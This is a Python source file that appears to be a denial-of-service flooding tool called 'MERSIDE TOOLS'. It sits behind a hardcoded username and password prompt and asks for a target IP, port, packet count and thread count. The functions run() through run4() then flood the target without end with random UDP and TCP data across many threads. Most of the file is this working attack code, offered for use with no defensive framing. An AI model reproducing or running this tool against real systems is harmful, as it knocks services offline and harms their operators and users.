username="MerSide-012"
password="MerIsG0D"

from itertools import cycle
from shutil import get_terminal_size
import random
import socket
import threading
import os,sys
import time
import getpass

class Loader:
    def __init__(self, desc="Loading...", end="Done!", timeout=0.1):
        """
        A loader-like context manager

        Args:
            desc (str, optional): The loader's description. Defaults to "Loading...".
            end (str, optional): Final print. Defaults to "Done!".
            timeout (float, optional): Sleep time between prints. Defaults to 0.1.
        """
        self.desc = desc
        self.end = end
        self.timeout = timeout

        self._thread = threading.Thread(target=self._animate, daemon=True)
        self.steps = ["[ | ]", "[ / ]", "[ - ]", "[ \\ ]", "[ | ]", "[ / ]", "[ - ]", "[ \\ ]"]
        self.done = False

    def start(self):
        self._thread.start()
        return self

    def _animate(self):
        for c in cycle(self.steps):
            if self.done:
                break
            print(f"\r{self.desc} {c}", flush=True, end="")
            time.sleep(self.timeout)

    def __enter__(self):
        self.start()

    def stop(self):
        self.done = True
        cols = get_terminal_size((80, 20)).columns
        print("\r" + " " * cols, end="", flush=True)
        print(f"\r{self.end}", flush=True)

    def __exit__(self, exc_type, exc_value, tb):
        # handle exceptions with those variables ^
        self.stop()


os.system("cls")

for i in range(3):
    inptuser = input("\033[31m[>]\033[0m Input Username: ")

    if(inptuser == username):
        time.sleep(0.25)
        loader = Loader("\033[31m[>]\033[0m Checking Your Username", "\033[31m[>]\033[0m Your username is registered", 0.15).start()
        for i in range(10):
            time.sleep(0.50)
        loader.stop()
        break
    else:
        time.sleep(0.25)
        loader = Loader("\033[31m[>]\033[0m Checking Your Username", "\033[31m[!]\033[0m Your username is incorrect!", 0.15).start()
        for i in range(10):
            time.sleep(0.50)
        loader.stop()        
        continue
time.sleep(1)

for i in range(3):
    inptpass = getpass.getpass("\033[31m[>]\033[0m Input Password: ")

    if(inptpass == password):
        time.sleep(0.25)
        loader = Loader("\033[31m[>]\033[0m Checking Your Password", "\033[31m[>]\033[0m Successfully login to your account", 0.15).start()
        for i in range(10):
            time.sleep(0.50)
        loader.stop()        
        break
    else:
        time.sleep(0.25)
        loader = Loader("\033[31m[>]\033[0m Checking Your Password", "\033[31m[!]\033[0m The Password you entered is incorrect!", 0.15).start()
        for i in range(10):
            time.sleep(0.50)
        loader.stop()  
        continue
time.sleep(1)

os.system("cls")

print("\033[31m")
print("""
███╗   ███╗███████╗██████╗ ███████╗██╗██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
████╗ ████║██╔════╝██╔══██╗██╔════╝██║██╔══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██╔████╔██║█████╗  ██████╔╝███████╗██║██║  ██║█████╗         ██║   ██║   ██║██║   ██║██║     ███████╗
██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║██║██║  ██║██╔══╝         ██║   ██║   ██║██║   ██║██║     ╚════██║
██║ ╚═╝ ██║███████╗██║  ██║███████║██║██████╔╝███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                                Author : Yuda
""")
print("\033[0m")

inptip = str(input("\033[31m[>]\033[0m Input IP Target: "))
inptport = int(input("\033[31m[>]\033[0m Input Port Target: "))
inpttimes = int(input("\033[31m[>]\033[0m Input Packets: "))
inptthreads = int(input("\033[31m[>]\033[0m Input Threads: "))
inptchoice = str(input("\033[31m[>]\033[0m DO YOU REALLY WANT TO ATTACK HIM? (Y)es/(N)o: "))
time.sleep(1)
loader = Loader("\033[31m[>]\033[0m TRYING TO LOCK THE TARGET WITH IP %s AND PORT %s"%(inptip, inptport), "\033[31m[>]\033[0m TARGET SUCCESSFULLY LOCKED, WAITING FOR DDOS PROCESS", 0.20).start()
for i in range(10):
    time.sleep(2)
loader.stop()
loader = Loader("\033[31m[>]\033[0m WAIT A FEW MORE SECONDS", "\033[31m[>]\033[0m DDOS START TO ATTACK", 0.25).start()
for i in range(10):
    time.sleep(1.50)
loader.stop()

os.system("cls")

def run():
        data = random._urandom(1800)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(inptip),int(inptport))
                        for x in range(inpttimes):
                                s.sendto(data,addr)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run ]\033[0m")

def run2():
        data = random._urandom(1024)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((inptip,inptport))
                        s.send(data)
                        for x in range(inpttimes):
                                s.send(data)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        s.close()
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run 2 ]\033[0m")

def run3():
        data = random._urandom(16)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((inptip,inptport))
                        s.send(data)
                        for x in range(inpttimes):
                                s.send(data)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        s.close()
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run 3 ]\033[0m")


def run4():
        data = random._urandom(16)
        i = random.choice(("\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> ","\033[31m[>] \033[33m[M3RS1D3] \033[0m==> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((inptip,inptport))
                        s.send(data)
                        for x in range(inpttimes):
                                s.send(data)
                        print(i +"\033[91mSTART ATTACK WITH IP \033[97m%s \033[91mAND PORT \033[97m%s\033[0m"%(inptip, inptport))
                except:
                        s.close()
                        print("\033[91m[!] \033[97mATTACK DOESN'T EXPECT [ run 4 ]\033[0m")

for y in range(inptthreads):
        if inptchoice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
                th = threading.Thread(target = run3)
                th.start()
        else:
                th = threading.Thread(target = run4)
                th.start()
